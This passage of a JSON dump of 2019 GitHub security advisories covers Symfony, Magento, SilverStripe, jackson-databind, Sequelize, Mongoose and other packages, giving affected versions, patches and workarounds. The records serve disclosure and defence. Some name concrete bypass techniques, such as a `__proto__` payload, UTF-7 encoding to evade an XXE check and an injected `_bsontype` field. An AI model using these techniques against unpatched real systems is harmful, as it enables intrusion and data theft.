    "description": "In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, HTTP Methods provided as verbs or using the override header may be treated as trusted input, but they are not validated, possibly causing SQL injection or XSS. This is related to symfony/http-foundation.",
    "summary": "Invalid HTTP method overrides allow possible XSS or other attacks in Symfony"
  },
  {
    "ghsaId": "GHSA-4vpc-5jx4-cfqg",
    "publishedAt": "2019-12-02T18:09:21Z",
    "description": "An issue was discovered in Symfony 4.2.0 to 4.2.11 and 4.3.0 to 4.3.7. The ability to enumerate users was possible due to different handling depending on whether the user existed when making unauthorized attempts to use the switch users functionality. This is related to symfony/security.",
    "summary": "User enumeration leak using switch user functionality in Symfony"
  },
  {
    "ghsaId": "GHSA-xhh6-956q-4q69",
    "publishedAt": "2019-12-02T18:08:19Z",
    "description": "An issue was discovered in Symfony 2.8.0 through 2.8.50, 3.4.0 through 3.4.34, 4.2.0 through 4.2.11, and 4.3.0 through 4.3.7. If an application passes unvalidated user input as the file for which MIME type validation should occur, then arbitrary arguments are passed to the underlying file command. This is related to symfony/http-foundation (and symfony/mime in 4.3.x).",
    "summary": "Argument injection in a MimeTypeGuesser in Symfony"
  },
  {
    "ghsaId": "GHSA-79gr-58r3-pwm3",
    "publishedAt": "2019-12-02T18:07:16Z",
    "description": "An issue was discovered in Symfony 3.4.0 through 3.4.34, 4.2.0 through 4.2.11, and 4.3.0 through 4.3.7. Serializing certain cache adapter interfaces could result in remote code injection. This is related to symfony/cache.",
    "summary": "Forbid serializing AbstractAdapter and TagAwareAdapter instances"
  },
  {
    "ghsaId": "GHSA-cmch-296j-wfvw",
    "publishedAt": "2019-12-02T18:06:14Z",
    "description": "An attacker can include file contents from outside the `/adapter/xxx/` directory, where `xxx` is the name of an existent adapter like \"admin\". It is exploited using the administrative web panel with a request for an adapter file. **Note:** The attacker has to be logged in if the authentication is enabled (by default isn't enabled).",
    "summary": "Directory traversal in iobroker.js-controller"
  },
  {
    "ghsaId": "GHSA-fpff-384j-vxq7",
    "publishedAt": "2019-12-02T18:05:13Z",
    "description": "pimcore/pimcore before 6.3.0 is vulnerable to SQL Injection. An attacker with limited privileges (classes permission) can achieve a SQL injection that can lead in data leakage. The vulnerability can be exploited via 'id', 'storeId', 'pageSize' and 'tables' parameters, using a payload for trigger a time based or error based sql injection.",
    "summary": "Data leakage via SQL Injection in Pimcore"
  },
  {
    "ghsaId": "GHSA-5pm8-492c-92p5",
    "publishedAt": "2019-12-02T18:04:11Z",
    "description": "Chartkick.js 3.1.0 through 3.1.3, as used in the Chartkick gem before 3.3.0 for Ruby, allows prototype pollution.",
    "summary": "Prototype pollution in Chartkick"
  },
  {
    "ghsaId": "GHSA-7xxv-wpxj-mx5v",
    "publishedAt": "2019-12-02T18:03:09Z",
    "description": "typed_ast 1.3.0 and 1.3.1 has an ast_for_arguments out-of-bounds read. An attacker with the ability to cause a Python interpreter to parse Python source (but not necessarily execute it) may be able to crash the interpreter process. This could be a concern, for example, in a web-based service that parses (but does not execute) Python code. (This issue also affected certain Python 3.8.0-alpha prereleases.)",
    "summary": "Out-of-bounds read in typed-ast and cpython may allow an attacker to crash the interpreter process (ast_for_arguments case)."
  },
  {
    "ghsaId": "GHSA-m3jw-62m7-jjcm",
    "publishedAt": "2019-12-02T18:02:02Z",
    "description": "typed_ast 1.3.0 and 1.3.1 has a handle_keywordonly_args out-of-bounds read. An attacker with the ability to cause a Python interpreter to parse Python source (but not necessarily execute it) may be able to crash the interpreter process. This could be a concern, for example, in a web-based service that parses (but does not execute) Python code. (This issue also affected certain Python 3.8.0-alpha prereleases.)",
    "summary": "Out-of-bounds read in typed-ast and cpython may allow an attacker to crash the interpreter process (handle_keywordonly_args case)."
  },
  {
    "ghsaId": "GHSA-89px-ww3j-g2mm",
    "publishedAt": "2019-11-29T17:05:59Z",
    "description": "## 2FA bypass through new device path\r\n\r\n### Impact\r\nIf someone gains access to someone's Wagtail login credentials, they can log into the CMS and bypass the 2FA check by changing the URL. They can then add a new device and gain full access to the CMS.\r\n\r\n### Patches\r\nThis problem has been patched in version 1.3.0.\r\n\r\n### Workarounds\r\nThere is no workaround at the moment.\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [github.com/labd/wagtail-2fa](https://github.com/labd/wagtail-2fa)\r\n* Email us at [security@labdigital.nl](mailto:security@labdigital.nl)\r\n\r\n",
    "summary": "2FA bypass in Wagtail through new device path"
  },
  {
    "ghsaId": "GHSA-m52x-29pq-w3vv",
    "publishedAt": "2019-11-22T18:18:03Z",
    "description": "## XSS vulnerability\r\n\r\n### Impact\r\nURLs were not sanitized for data URIs (or `vbscript:`), allowing for potential XSS attacks. Such an attack would require a user to click on a hot spot to execute and would require an attacker-provided configuration. The most plausible potential attack would be if `pannellum.htm` was hosted on a domain that shared cookies with the targeted site's user authentication; an  `<iframe>` could then be embedded on the attacker's site using `pannellum.htm` from the targeted site, which would allow the attacker to potentially access information from the targeted site as the authenticated user (or worse if the targeted site did not have adequate CSRF protections) if the user clicked on a hot spot in the attacker's embedded panorama viewer.\r\n\r\n### Patches\r\nThis was patched in version 2.5.5.\r\n\r\n### Workarounds\r\nDon't host `pannellum.htm` on a domain that shares cookies with user authentication.\r\n\r\n### Acknowledgments\r\nThank you to Max Schaefer of GitHub Security Lab for reporting this issue.\r\n",
    "summary": "Low severity vulnerability that affects pannellum"
  },
  {
    "ghsaId": "GHSA-q3p4-gw7r-wqjc",
    "publishedAt": "2019-11-22T13:45:22Z",
    "description": "A malicious admin user could edit the state of objects in the Airflow metadata database to execute arbitrary javascript on certain page views. This also presented a Local File Disclosure vulnerability to any file readable by the webserver process.",
    "summary": "Moderate severity vulnerability that affects apache-airflow"
  },
  {
    "ghsaId": "GHSA-68wg-qv6r-j4vp",
    "publishedAt": "2019-11-20T17:44:54Z",
    "description": "Pixie versions 1.0.x before 1.0.3, and 2.0.x before 2.0.2 allow SQL Injection in the limit() function due to improper sanitization.",
    "summary": "SQL Injection in usmanhalalit/pixie"
  },
  {
    "ghsaId": "GHSA-89mq-4x47-5v83",
    "publishedAt": "2019-11-20T15:29:43Z",
    "description": "In AngularJS before 1.7.9 the function `merge()` could be tricked into adding or modifying properties of `Object.prototype` using a `__proto__` payload.",
    "summary": "Prototype pollution attack in AngularJS"
  },
  {
    "ghsaId": "GHSA-vvwv-h69m-wg6f",
    "publishedAt": "2019-11-20T01:39:57Z",
    "description": "PHPOffice PhpSpreadsheet before 1.8.0 has an XXE issue. The XmlScanner decodes the sheet1.xml from an .xlsx to utf-8 if something else than UTF-8 is declared in the header. This was a security measurement to prevent CVE-2018-19277 but the fix is not sufficient. By double-encoding the the xml payload to utf-7 it is possible to bypass the check for the string ?<!ENTITY? and thus allowing for an xml external entity processing (XXE) attack.",
    "summary": "XXE in PHPSpreadsheet due to incomplete fix for previous encoding issue"
  },
  {
    "ghsaId": "GHSA-xcrg-29h7-h4cj",
    "publishedAt": "2019-11-20T01:38:52Z",
    "description": "securityScan() in PHPOffice PhpSpreadsheet through 1.5.0 allows a bypass of protection mechanisms for XXE via UTF-7 encoding in a .xlsx file",
    "summary": "XXE in PHPSpreadsheet due to encoding issue"
  },
  {
    "ghsaId": "GHSA-hx83-rpqf-m267",
    "publishedAt": "2019-11-20T01:38:00Z",
    "description": "In Apache Hadoop 3.1.0 to 3.1.1, 3.0.0-alpha1 to 3.0.3, 2.9.0 to 2.9.1, and 2.0.0-alpha to 2.8.4, the user/group information can be corrupted across storing in fsimage and reading back from fsimage.",
    "summary": "user/group information can be corrupted across storing in fsimage and reading back from fsimage"
  },
  {
    "ghsaId": "GHSA-vrcf-g539-x6h3",
    "publishedAt": "2019-11-20T01:37:13Z",
    "description": "Uncontrolled deserialization of a pickled object in models.py in Frost Ming rediswrapper (aka Redis Wrapper) before 0.3.0 allows attackers to execute arbitrary scripts.",
    "summary": "Uncontrolled deserialization of a pickled object in rediswrapper allows attackers to execute arbitrary scripts"
  },
  {
    "ghsaId": "GHSA-9ggp-4jpr-7ppj",
    "publishedAt": "2019-11-20T01:35:53Z",
    "description": "In RPyC 4.1.x through 4.1.1, a remote attacker can dynamically modify object attributes to construct a remote procedure call that executes code for an RPyC service with default configuration settings.",
    "summary": "Possible remote code execution via a remote procedure call"
  },
  {
    "ghsaId": "GHSA-mr6r-82x4-f4jj",
    "publishedAt": "2019-11-20T01:34:50Z",
    "description": "In elliptic-php versions priot to 1.0.6, Timing attacks might be possible which can result in practical recovery of the long-term private key generated by the library under certain conditions. Leakage of a bit-length of the scalar during scalar multiplication is possible on an elliptic curve which might allow practical recovery of the long-term private key.",
    "summary": "Timing attacks might allow practical recovery of the long-term private key"
  },
  {
    "ghsaId": "GHSA-8vh8-vc28-m2hf",
    "publishedAt": "2019-11-20T01:33:54Z",
    "description": "A flaw was found in, all under 2.0.20, in the Undertow DEBUG log for io.undertow.request.security. If enabled, an attacker could abuse this flaw to obtain the user's credentials from the log files.",
    "summary": "Potential to access user credentials from the log files when debug logging enabled"
  },
  {
    "ghsaId": "GHSA-h7qw-mxrm-c6h2",
    "publishedAt": "2019-11-20T01:33:05Z",
    "description": "The __construct function in Framework/Encryption/Crypt.php in Magento 2 uses the PHP rand function to generate a random number for the initialization vector, which makes it easier for remote attackers to defeat cryptographic protection mechanisms by guessing the value.",
    "summary": "Unauthenticated crypto and weak IV in Magento\\Framework\\Encryption"
  },
  {
    "ghsaId": "GHSA-6g88-vr3v-76mf",
    "publishedAt": "2019-11-20T01:31:31Z",
    "description": "Eval injection in the Math plugin of Limnoria (before 2019.11.09) and Supybot (through 2018-05-09) allows remote unprivileged attackers to disclose information or possibly have unspecified other impact via the calc and icalc IRC commands.",
    "summary": "Eval injection in Supybot/Limnoria"
  },
  {
    "ghsaId": "GHSA-pgwj-prpq-jpc2",
    "publishedAt": "2019-11-18T17:27:31Z",
    "description": "In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, when service ids allow user input, this could allow for SQL Injection and remote code execution. This is related to symfony/dependency-injection.",
    "summary": "Check service IDs are valid"
  },
  {
    "ghsaId": "GHSA-89r3-rcpj-h7w6",
    "publishedAt": "2019-11-18T17:19:03Z",
    "description": "Tapestry processes assets `/assets/ctx` using classes chain `StaticFilesFilter -> AssetDispatcher -> ContextResource`, which doesn't filter the character `\\`, so attacker can perform a path traversal attack to read any files on Windows platform.",
    "summary": "Path traversal attack on Windows platforms"
  },
  {
    "ghsaId": "GHSA-5whq-j5qg-wjvp",
    "publishedAt": "2019-11-18T17:16:06Z",
    "description": "Cross-site scripting (XSS) is possible in DNN (formerly DotNetNuke) before 9.4.0 by remote authenticated users via the Display Name field in the admin notification function.",
    "summary": "XSS found in DNN (DotNetNuke)"
  },
  {
    "ghsaId": "GHSA-425c-ccf3-3jrr",
    "publishedAt": "2019-11-15T23:10:35Z",
    "description": "## Validator parsing discrepancy due to string encoding\n\n### Impact\r\nA specially crafted Bitcoin script can cause a discrepancy between the specified SLP consensus rules and the validation result of the slpjs npm package. An attacker could create a specially crafted Bitcoin script in order to cause a hard-fork from the SLP consensus.\r\n\r\n### Patches\r\nAll versions > 0.21.3 are patched.\r\n\r\n### Workarounds\r\nUpgrade to any version >= 0.21.4.\r\n\r\n### References\r\nThe bug was located and fixed [here](https://github.com/simpleledger/slpjs/commit/ac8809b42e47790a6f0205991b36f2699ed10c84#diff-fe58606994c412ba56a65141a7aa4a62L701).\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in the [slpjs repo](https://github.com/simpleledger/slpjs/issues)\r\n* Email us at [info@slp.cash](mailto:info@slp.cash)\n",
    "summary": "Critical severity vulnerability that affects slpjs"
  },
  {
    "ghsaId": "GHSA-wmx6-vxcf-c3gr",
    "publishedAt": "2019-11-15T23:10:19Z",
    "description": "## Validator parsing discrepancy due to string encoding\n\n### Impact\r\nA specially crafted Bitcoin script can cause a discrepancy between the specified SLP consensus rules and the validation result of the slp-validate@1.0.0 npm package. An attacker could create a specially crafted Bitcoin script in order to cause a hard-fork from the SLP consensus.\r\n\r\n### Patches\r\nAll versions >1.0.0 have been patched.\r\n\r\n### Workarounds\r\nUpgrade to any version > 1.0.0.\r\n\r\n### References\r\nThe bug was located and fixed [here](https://github.com/simpleledger/slp-validate/commit/50ad96c2798dad6b9f9a13333dd05232defe5730#diff-fe58606994c412ba56a65141a7aa4a62L123).\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in [slp-validate](https://github.com/simpleledger/slp-validate)\r\n* Email us at [info@slp.cash](mailto:info@slp.cash)\n",
    "summary": "Critical severity vulnerability that affects slp-validate"
  },
  {
    "ghsaId": "GHSA-pf8f-w267-mq2h",
    "publishedAt": "2019-11-15T20:26:59Z",
    "description": "An issue was discovered in the rack-cors (aka Rack CORS Middleware) gem before 1.0.4 for Ruby. It allows ../ directory traversal to access private resources because resource matching does not ensure that pathnames are in a canonical format.",
    "summary": "The rack-cors rubygem may allow directory traveral"
  },
  {
    "ghsaId": "GHSA-cff7-6h4q-q5pj",
    "publishedAt": "2019-11-14T15:25:51Z",
    "description": "The json-jwt gem before 1.11.0 for Ruby lacks an element count during the splitting of a JWE string.",
    "summary": "Lacks element count during splitting of JWE string"
  },
  {
    "ghsaId": "GHSA-gjmw-vf9h-g25v",
    "publishedAt": "2019-11-13T00:32:38Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload.",
    "summary": "Polymorphic typing issue"
  },
  {
    "ghsaId": "GHSA-fmmc-742q-jg75",
    "publishedAt": "2019-11-13T00:32:27Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the p6spy (3.8.6) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of com.p6spy.engine.spy.P6DataSource mishandling.",
    "summary": "Polymorphic typing issue"
  },
  {
    "ghsaId": "GHSA-6r58-4xgr-gm6m",
    "publishedAt": "2019-11-12T23:01:59Z",
    "description": "In SilverStripe through 4.3.3, there is access escalation for CMS users with limited access through permission cache pollution.",
    "summary": "Access escalation for CMS users with limited access through permission cache pollution"
  },
  {
    "ghsaId": "GHSA-jvx5-rm6q-gx7p",
    "publishedAt": "2019-11-12T23:01:50Z",
    "description": "SilverStripe through 4.3.3 has incorrect access control for protected files uploaded via Upload::loadIntoFile(). An attacker may be able to guess a filename in silverstripe/assets via the AssetControlExtension.",
    "summary": "Incorrect access control for protected files uploaded via Upload::loadIntoFile()"
  },
  {
    "ghsaId": "GHSA-w7r7-r8r9-vrg2",
    "publishedAt": "2019-11-12T23:01:39Z",
    "description": "SilverStripe through 4.3.3 allows session fixation in the \"change password\" form.",
    "summary": "Moderate severity vulnerability that affects silverstripe/framework"
  },
  {
    "ghsaId": "GHSA-cg8j-8w52-735v",
    "publishedAt": "2019-11-12T23:01:25Z",
    "description": "In SilverStripe through 4.3.3, a missing warning about leaving install.php in a public webroot can lead to unauthenticated admin access.",
    "summary": "Moderate severity vulnerability that affects silverstripe/cms and silverstripe/framework"
  },
  {
    "ghsaId": "GHSA-xm6j-x342-gwq9",
    "publishedAt": "2019-11-12T23:01:05Z",
    "description": "In the Versioned Files module through 2.0.3 for SilverStripe 3.x, unpublished versions of files are publicly exposed to anyone who can guess their URL. This guess could be highly informed by a basic understanding of the symbiote/silverstripe-versionedfiles source code. (Users who upgrade from SilverStripe 3.x to 4.x and had Versioned Files installed have no further need for this module, because the 4.x release has built-in versioning. However, nothing in the upgrade process automates the destruction of these insecure artefacts, nor alerts the user to the criticality of destruction.)",
    "summary": "Unpublished versions of files are publicly exposed to anyone who can guess their URL"
  },
  {
    "ghsaId": "GHSA-g996-q5r8-w7g2",
    "publishedAt": "2019-11-12T23:00:53Z",
    "description": "In Symfony before 2.7.51, 2.8.x before 2.8.50, 3.x before 3.4.26, 4.x before 4.1.12, and 4.2.x before 4.2.7, validation messages are not escaped, which can lead to XSS when user input is included. This is related to symfony/framework-bundle.",
    "summary": "Escape validation messages in the PHP templating engine"
  },
  {
    "ghsaId": "GHSA-fm68-89m8-4gjj",
    "publishedAt": "2019-11-12T22:59:47Z",
    "description": "In Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3 or 2.3.2-p1, an unauthenticated user can inject arbitrary JavaScript code as a result of the sanitization engine ignoring HTML comments.",
    "summary": "Unauthenticated user can inject arbitrary JavaScript code as a result of sanitization engine ignoring HTML comments"
  },
  {
    "ghsaId": "GHSA-xv69-f7x5-r4qw",
    "publishedAt": "2019-11-12T22:59:43Z",
    "description": "A stored cross-site scripting (XSS) vulnerability exists in Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3 or 2.3.2-p1. An authenticated user can inject arbitrary JavaScript code into the attribute set name when listing the products.",
    "summary": "Authenticated user can inject arbitrary JavaScript code into the attribute set name when listing the products"
  },
  {
    "ghsaId": "GHSA-62fx-3v4f-mwxm",
    "publishedAt": "2019-11-12T22:59:40Z",
    "description": "A security bypass vulnerability exists in Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3 or 2.3.2-p1. A user with privileges to generate sitemaps can bypass configuration that restricts directory access. The bypass allows overwrite of a subset of configuration files which can lead to denial of service.",
    "summary": "User with privileges to generate sitemaps can bypass configuration that restricts directory access"
  },
  {
    "ghsaId": "GHSA-3q5x-7mxp-rp6j",
    "publishedAt": "2019-11-12T22:59:32Z",
    "description": "A remote code execution vulnerability exists in Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3 or 2.3.2-p1. Dependency injection through Symphony framework allows service identifiers to be derived from user controlled data, which can lead to remote code execution.",
    "summary": "Remote code execution possible via service identifiers derived from user controlled data"
  },
  {
    "ghsaId": "GHSA-89ch-hqf9-rgp3",
    "publishedAt": "2019-11-12T22:59:28Z",
    "description": "An insecure component vulnerability exists in Magento 2.1 prior to 2.1.19, Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3. Magento 2 codebase leveraged outdated versions of JS libraries (Bootstrap, jquery, Knockout) with known security vulnerabilities.",
    "summary": "Outdated versions of JS libraries used with known security vulnerabilities"
  },
  {
    "ghsaId": "GHSA-427g-2r83-3ccm",
    "publishedAt": "2019-11-12T22:59:24Z",
    "description": "An XML entity injection vulnerability exists in Magento 2.2 prior to 2.2.10, Magento 2.3 prior to 2.3.3 or 2.3.2-p1. An authenticated admin user can craft document type definition for an XML representing XML layout. The crafted document type definition and XML layout allow processing of external entities which can lead to information disclosure.",
    "summary": "XML entity injection vulnerability possible via crafted document type definition"
  },
  {
    "ghsaId": "GHSA-7qqr-3pj3-q2f5",
    "publishedAt": "2019-11-12T22:58:21Z",
    "description": "In system/workplace/ in Alkacon OpenCms 10.5.4 and 10.5.5, there are multiple Reflected and Stored XSS issues in the management interface.",
    "summary": "Multiple Reflected and Stored XSS issues in the management interface"
  },
  {
    "ghsaId": "GHSA-2p6p-v69p-9mm9",
    "publishedAt": "2019-11-12T22:58:16Z",
    "description": "In the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5, there is XSS in the Login form.",
    "summary": "Moderate severity vulnerability that affects org.opencms:opencms-core"
  },
  {
    "ghsaId": "GHSA-36hf-6hp2-9g4c",
    "publishedAt": "2019-11-12T22:58:14Z",
    "description": "In Alkacon OpenCms 10.5.4 and 10.5.5, there are multiple resources vulnerable to Local File Inclusion that allow an attacker to access server resources: clearhistory.jsp, convertxml.jsp, group_new.jsp, loginmessage.jsp, xmlcontentrepair.jsp, and /system/workplace/admin/history/settings/index.jsp.",
    "summary": "Multiple resources vulnerable to Local File Inclusion that allow an attacker to access server resources"
  },
  {
    "ghsaId": "GHSA-fxp8-7h5w-h235",
    "publishedAt": "2019-11-12T22:58:11Z",
    "description": "In the Alkacon OpenCms Apollo Template 10.5.4 and 10.5.5, there is XSS in the search engine.",
    "summary": "Moderate severity vulnerability that affects org.opencms:opencms-core"
  },
  {
    "ghsaId": "GHSA-pqm6-cgwr-x6pf",
    "publishedAt": "2019-11-08T20:06:46Z",
    "description": "Rob Richards XmlSecLibs, all versions prior to v3.0.3, as used for example by SimpleSAMLphp, performed incorrect validation of cryptographic signatures in XML messages, allowing an authenticated attacker to impersonate others or elevate privileges by creating a crafted XML message.",
    "summary": "Elevated privileges or user impersonation possible due to incorrect validation of cryptographic signatures in XML messages"
  },
  {
    "ghsaId": "GHSA-pwrf-q7h8-jjr7",
    "publishedAt": "2019-11-08T20:06:24Z",
    "description": "In Webkul Bagisto before 0.1.5, the functionalities for customers to change their own values (such as address, review, orders, etc.) can also be manipulated by other customers.",
    "summary": "Moderate severity vulnerability that affects bagisto/bagisto"
  },
  {
    "ghsaId": "GHSA-6268-v434-45m5",
    "publishedAt": "2019-11-08T20:06:08Z",
    "description": "Grav through 1.6.15 allows (Stored) Cross-Site Scripting due to JavaScript execution in SVG images.",
    "summary": "Moderate severity vulnerability that affects getgrav/grav"
  },
  {
    "ghsaId": "GHSA-852q-xxj4-x2rx",
    "publishedAt": "2019-11-08T20:05:45Z",
    "description": "The proxystatistics module before 3.1.0 for SimpleSAMLphp allows SQL Injection in lib/Auth/Process/DatabaseCommand.php.",
    "summary": "Moderate severity vulnerability that affects cesnet/simplesamlphp-module-proxystatistics"
  },
  {
    "ghsaId": "GHSA-m553-9wmx-533h",
    "publishedAt": "2019-11-08T20:05:31Z",
    "description": "In htdocs/societe/card.php in Dolibarr 10.0.1, the value of the User-Agent HTTP header is copied into the HTML document as plain text between tags, leading to XSS.",
    "summary": "Moderate severity vulnerability that affects dolibarr/dolibarr"
  },
  {
    "ghsaId": "GHSA-4j6x-w426-6rc6",
    "publishedAt": "2019-11-08T17:31:17Z",
    "description": "## Default Express middleware security check is ignored in production\r\n\r\n### Impact\r\nAll Cube.js deployments that use affected versions of `@cubejs-backend/api-gateway` with default express authentication middleware in production environment are affected.\r\n\r\n### Patches\r\n@cubejs-backend/api-gateway@0.11.17\r\n\r\n### Workarounds\r\nOverride default authentication express middleware: https://cube.dev/docs/@cubejs-backend-server-core#options-reference-check-auth-middleware\r\n\r\n### For more information\r\nIf you have any questions or comments about this advisory:\r\n* Open an issue in https://github.com/cube-js/cube.js/issues\r\n* Reach out us in community Slack: https://slack.cube.dev/\r\n\r\n",
    "summary": "Default Express middleware security check is ignored in production"
  },
  {
    "ghsaId": "GHSA-58p8-9g59-q2hr",
    "publishedAt": "2019-11-08T17:15:11Z",
    "description": "Apache CXF before 3.3.4 and 3.2.11 does not restrict the number of message attachments present in a given message. This leaves open the possibility of a denial of service type attack, where a malicious user crafts a message containing a very large number of message attachments. From the 3.3.4 and 3.2.11 releases, a default limit of 50 message attachments is enforced. This is configurable via the message property \"attachment-max-count\".",
    "summary": "Potential DOS attack due to unrestricted attachment count in messages"
  },
  {
    "ghsaId": "GHSA-cw6w-q88j-6mqf",
    "publishedAt": "2019-11-08T17:12:59Z",
    "description": "Apache CXF before 3.3.4 and 3.2.11 provides all of the components that are required to build a fully fledged OpenId Connect service. There is a vulnerability in the access token services, where it does not validate that the authenticated principal is equal to that of the supplied clientId parameter in the request. If a malicious client was able to somehow steal an authorization code issued to another client, then they could exploit this vulnerability to obtain an access token for the other client.",
    "summary": "Potential session hijack in Apache CXF "
  },
  {
    "ghsaId": "GHSA-jqwc-jm56-wcwj",
    "publishedAt": "2019-11-08T17:07:42Z",
    "description": "Jupyter Notebook before 5.5.0 does not use a CSP header to treat served files as belonging to a separate origin. Thus, for example, an XSS payload can be placed in an SVG document.",
    "summary": "Potential XSS in Jupyter Notebook"
  },
  {
    "ghsaId": "GHSA-2598-2f59-rmhq",
    "publishedAt": "2019-11-08T17:05:17Z",
    "description": "sequelize before version 3.35.1 allows attackers to perform a SQL Injection due to the JSON path keys not being properly sanitized in the Postgres dialect.",
    "summary": "SQL injection possible due to JSON path keys not being properly sanitized"
  },
  {
    "ghsaId": "GHSA-cj8p-53v9-2c26",
    "publishedAt": "2019-11-08T15:28:11Z",
    "description": "Bolt before 3.6.10 has XSS via createFolder or createFile in Controller/Async/FilesystemManager.php.",
    "summary": "Moderate severity vulnerability that affects bolt/bolt"
  },
  {
    "ghsaId": "GHSA-j9xp-92vc-559j",
    "publishedAt": "2019-11-06T17:11:10Z",
    "description": "Sequelize all versions prior to 3.35.1, 4.44.3, and 5.8.11 are vulnerable to SQL Injection due to JSON path keys not being properly escaped for the MySQL/MariaDB dialects.",
    "summary": "SQL injection possible due to JSON path keys not being properly escaped"
  },
  {
    "ghsaId": "GHSA-rc75-cf5c-mxvh",
    "publishedAt": "2019-11-06T17:06:28Z",
    "description": "The SAML identifier generated within SAML2Utils.java was found to make use of the apache commons-lang3 RandomStringUtils class which makes them predictable due to RandomStringUtils PRNG's algorithm not being cryptographically strong. This issue only affects the 3.X release of pac4j-saml.",
    "summary": "Generated SAML identifier predictable due to algorithm used not being cryptographically strong"
  },
  {
    "ghsaId": "GHSA-c3gv-9cxf-6f57",
    "publishedAt": "2019-11-05T23:58:25Z",
    "description": "In the Loofah gem for Ruby through v2.3.0 unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished.",
    "summary": "Unsanitized JavaScript may occur in sanitized output when a crafted SVG element is republished"
  },
  {
    "ghsaId": "GHSA-mx7p-6679-8g3q",
    "publishedAt": "2019-10-28T20:51:15Z",
    "description": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the commons-dbcp (1.4) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of org.apache.commons.dbcp.datasources.SharedPoolDataSource and org.apache.commons.dbcp.datasources.PerUserPoolDataSource mishandling.",
    "summary": "Polymorphic Typing in FasterXML jackson-databind"
  },
  {
    "ghsaId": "GHSA-m9jw-237r-gvfv",
    "publishedAt": "2019-10-25T19:43:16Z",
    "description": "Sequelize, all versions prior to version 4.44.3 and 5.15.1, is vulnerable to SQL Injection due to sequelize.json() helper function not escaping values properly when formatting sub paths for JSON queries for MySQL, MariaDB and SQLite.",
    "summary": "SQL injection possible from JSON helper function not escaping values properly"
  },
  {
    "ghsaId": "GHSA-hhwc-8g49-j8jx",
    "publishedAt": "2019-10-25T19:41:34Z",
    "description": "The ruby_parser-legacy (aka legacy) gem 1.0.0 for Ruby allows local privilege escalation because of world-writable files. For example, if the brakeman gem (which has a legacy dependency) 4.5.0 through 4.7.0 is used, a local user can insert malicious code into the ruby_parser-legacy-1.0.0/lib/ruby_parser/legacy/ruby_parser.rb file.",
    "summary": "Local privilege escalation because of world-writable files"
  },
  {
    "ghsaId": "GHSA-xg59-m7wx-853q",
    "publishedAt": "2019-10-25T19:41:24Z",
    "description": "It is possible to inject JavaScript within node-red-dashboard versions prior to version 2.17.0 due to the ui_notification node accepting raw HTML by default.",
    "summary": "Cross site scripting possible due to bypassed input sanitization"
  },
  {
    "ghsaId": "GHSA-vfj6-275q-4pvm",
    "publishedAt": "2019-10-25T13:55:20Z",
    "description": "### Impact\nsend_email in graphite-web/webapp/graphite/composer/views.py in Graphite through 1.1.5 is vulnerable to SSRF. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an e-mail address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information. Email will be send through SMTP server configured in Graphite, by default it's 'localhost'\n\n### Patches\nProblem was patched in Graphite-web 1.1.6. Also patches was released for graphite-web [1.0.x](https://github.com/graphite-project/graphite-web/pull/2501) and [0.9.x](https://github.com/graphite-project/graphite-web/pull/2500), and we'll discuss releases of non-supported branches later.\n\n### Workarounds\nYou can manually remove function `send_email` from file `webapp/graphite/composer/views.py`. This function are not in use and will not affect your Graphite installation.\n\n### References\nFor more information check this graphite-web Github issue #2008 \n\n### For more information\nIf you have any questions or comments about this advisory:\n* Add comment in [issue #2008](https://github.com/graphite-project/graphite-web/issues/2008)",
    "summary": "graphite.composer.views.send_email vulnerable to SSRF"
  },
  {
    "ghsaId": "GHSA-c9cg-q8r2-xvjq",
    "publishedAt": "2019-10-24T20:56:12Z",
    "description": "Auth0 auth0.net before 6.5.4 has Incorrect Access Control because IdentityTokenValidator can be accidentally used to validate untrusted ID tokens.",
    "summary": "Incorrect access control due to IdentityTokenValidator performing limited token validation"
  },
  {
    "ghsaId": "GHSA-27p5-7cw6-m45h",
    "publishedAt": "2019-10-24T20:46:54Z",
    "description": "The unoconv package before 0.9 mishandles untrusted pathnames, leading to SSRF and local file inclusion.",
    "summary": "Mishandled untrusted pathnames could lead to SSRF and local file inclusion"
  },
  {
    "ghsaId": "GHSA-j52r-xc68-q8f4",
    "publishedAt": "2019-10-23T14:14:32Z",
    "description": "Pivotal Reactor Netty, versions prior to 0.8.11, passes headers through redirects, including authorization ones. A remote unauthenticated malicious user may gain access to credentials for a different server than they have access to.",
    "summary": "Authorization headers passed through redirects"
  },
  {
    "ghsaId": "GHSA-8687-vv9j-hgph",
    "publishedAt": "2019-10-22T20:19:54Z",
    "description": "Automattic Mongoose through 5.7.4 allows attackers to bypass access control (in some applications) because any query object with a _bsontype attribute is ignored. For example, adding \"_bsontype\":\"a\" can sometimes interfere with a query filter. NOTE: this CVE is about Mongoose's failure to work around this _bsontype special case that exists in older versions of the bson parser (aka the mongodb/js-bson project).",
